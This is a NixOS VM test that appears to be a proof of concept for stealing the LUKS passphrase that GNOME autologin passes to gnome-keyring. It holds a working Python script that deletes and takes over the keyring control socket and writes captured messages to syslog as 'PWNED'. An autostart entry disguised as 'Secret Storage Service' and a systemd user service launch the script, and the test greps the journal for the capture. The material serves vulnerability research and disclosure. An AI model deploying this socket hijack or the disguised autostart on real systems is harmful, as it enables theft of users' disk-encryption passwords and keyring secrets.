# Based on https://github.com/NixOS/nixpkgs/blob/553b959505b847cdbf31abe88d69c1d368f8e394/nixos/tests/luks.nix
# and https://github.com/NixOS/nixpkgs/blob/master/nixos/tests/gnome.nix
import ./make-test-python.nix ({ lib, pkgs, ... }: {
  name = "luks-gnome-autologin-poc";

  nodes.machine = { pkgs, config, ... }: let
    user = config.users.users.alice;

    exfiltrator = pkgs.writeScript
      "gnome-keyring-secrets-exfiltrator"
      ''
        #!${pkgs.python3.interpreter}
        # Based on https://stackoverflow.com/a/58528177/160386
        from pathlib import Path
        from socketserver import UnixStreamServer, BaseRequestHandler, ThreadingMixIn
        import os
        import stat
        import syslog

        # Take over the control socket
        xdg_runtime_dir = Path(os.environ.get('XDG_RUNTIME_DIR'))
        sock_path = xdg_runtime_dir / 'keyring/control'
        sock_path.parent.mkdir(parents=True, exist_ok=True)

        sock_path.unlink(missing_ok=True)

        class Handler(BaseRequestHandler):
            def handle(self):
                while True:
                    msg = self.request.recv(1024)
                    if msg:
                        syslog.syslog(f"PWNED: '{msg}'")
                    else:
                        return

        class ThreadedUnixStreamServer(ThreadingMixIn, UnixStreamServer):
            pass

        with ThreadedUnixStreamServer(str(sock_path), Handler) as server:
            syslog.syslog(f"Starting socket on {sock_path}")

            try:
                # Perform lstat on the path
                file_stat = os.lstat(sock_path)

                # Check if it's a socket
                if stat.S_ISSOCK(file_stat.st_mode):
                    syslog.syslog(f"{sock_path} is a socket")
                else:
                    syslog.syslog(f"{sock_path} is not a socket")

                # Check if it's a symbolic link
                if stat.S_ISLNK(file_stat.st_mode):
                    syslog.syslog(f"{sock_path} is a symbolic link")
                else:
                    syslog.syslog(f"{sock_path} is not a symbolic link")

                # Other checks can be performed using the `file_stat` attributes
                # For example, check ownership
                syslog.syslog(f"Owner UID: {file_stat.st_uid}")
                syslog.syslog(f"File mode: {file_stat.st_mode}")

            except FileNotFoundError:
                syslog.syslog(f"{sock_path} does not exist")
            except PermissionError:
                syslog.syslog(f"Permission denied when accessing {sock_path}")
            except OSError as e:
                syslog.syslog(f"Error accessing {sock_path}: {e}")

            server.serve_forever()
      '';

    exfiltratorService = pkgs.writeTextFile {
      name = "gnome-keyring-secrets-exfiltrator.service";
      text = ''
        [Unit]
        Description=gnome-keyring-secrets exfiltrator service

        [Service]
        Type=simple
        ExecStart=${exfiltrator}
        Restart=always

        [Install]
        WantedBy=default.target
      '';
      destination = "/lib/systemd/user/gnome-keyring-secrets-exfiltrator.service";
    };

    exfiltratorAutostart = pkgs.writeTextFile {
      name = "gnome-keyring-secrets.desktop";
      text = ''
        [Desktop Entry]
        Type=Application
        Name=Secret Storage Service
        Exec=systemctl start --user gnome-keyring-secrets-exfiltrator
        OnlyShowIn=GNOME;Unity;MATE;
        NoDisplay=true
        X-GNOME-Autostart-Phase=PreDisplayServer
        X-GNOME-AutoRestart=false
        X-GNOME-Autostart-Notify=true
      '';
    };
  in {
    imports = [
      ./common/auto-format-root-device.nix
      ./common/user-account.nix
    ];

    services.xserver.enable = true;

    services.xserver.displayManager = {
      gdm.enable = true;
      gdm.debug = true;
    };

    services.displayManager.autoLogin = {
      enable = true;
      user = "alice";
    };

    services.xserver.desktopManager.gnome.enable = true;
    services.xserver.desktopManager.gnome.debug = true;
    # Reduce size
    services.gnome.core-utilities.enable = false;
    programs.gnome-terminal.enable = true;

    # Use systemd-boot
    virtualisation = {
      emptyDiskImages = [ 512 512 ];
      useBootLoader = true;
      useEFIBoot = true;
      # To boot off the encrypted disk, we need to have a init script which comes from the Nix store
      mountHostNixStore = true;
    };
    boot.loader.systemd-boot.enable = true;

    boot.kernelParams = lib.mkOverride 5 [ "console=tty1" ];

    environment.systemPackages = with pkgs; [ cryptsetup ];

    virtualisation.memorySize = 4096;

    systemd.tmpfiles.rules = [
      # Replaces ${pkgs.gnome-keyring}/etc/xdg/autostart/gnome-keyring-secrets.desktop
      "d /home/alice/.config 0755 ${user.name} ${user.group} - -"
      "d /home/alice/.config/autostart 0755 ${user.name} ${user.group} - -"
      "L+ /home/alice/.config/autostart/gnome-keyring-secrets.desktop - - - - ${exfiltratorAutostart}"
    ];

    systemd.packages = [
      exfiltratorService
    ];

    # Work around https://github.com/NixOS/nixpkgs/issues/81138
    systemd.user.services.gnome-keyring-secrets-exfiltrator.wantedBy = [ "default.target" ];

    specialisation = rec {
      boot-luks.configuration = {
        boot.initrd.luks.devices = lib.mkVMOverride {
          # We have two disks and only type one password - key reuse is in place
          cryptroot.device = "/dev/vdb";
          cryptroot2.device = "/dev/vdc";
        };
        virtualisation.rootDevice = "/dev/mapper/cryptroot";
      };
    };
  };

  enableOCR = true;

  testScript = { nodes, ... }: let
    user = nodes.machine.users.users.alice;
    uid = toString user.uid;
  in ''
    # Create encrypted volume
    machine.wait_for_unit("multi-user.target")
    machine.succeed("echo -n supersecret | cryptsetup luksFormat -q --iter-time=1 /dev/vdb -")
    machine.succeed("echo -n supersecret | cryptsetup luksFormat -q --iter-time=1 /dev/vdc -")

    # Boot from the encrypted disk
    machine.succeed("bootctl set-default nixos-generation-1-specialisation-boot-luks.conf")
    machine.succeed("sync")
    machine.crash()

    # Boot and decrypt the disk
    machine.start()
    machine.wait_for_text("Passphrase for")
    machine.send_chars("supersecret\n")
    machine.wait_for_unit("multi-user.target")

    assert "/dev/mapper/cryptroot on / type ext4" in machine.succeed("mount")

    with subtest("Login to GNOME with GDM"):
        # wait for gdm to start
        machine.wait_for_unit("display-manager.service")
        # wait for the wayland server
        machine.wait_for_file("/run/user/${uid}/wayland-0")
        # wait for alice to be logged in
        machine.wait_for_unit("default.target", "${user.name}")
        # check that logging in has given the user ownership of devices
        assert "alice" in machine.succeed("getfacl -p /dev/snd/timer")

    # Ignoring later messages from other gnome-keyring daemons
    machine.fail("journalctl --grep 'PWNED(?!.+(pkcs11|ssh).x00)' > /dev/stderr")

    # Trying to debug
    # machine.fail("stat /run/user/1000/keyring/control > /dev/stderr")
    machine.fail("journalctl -xea -nall > /dev/stderr")
  '';
})
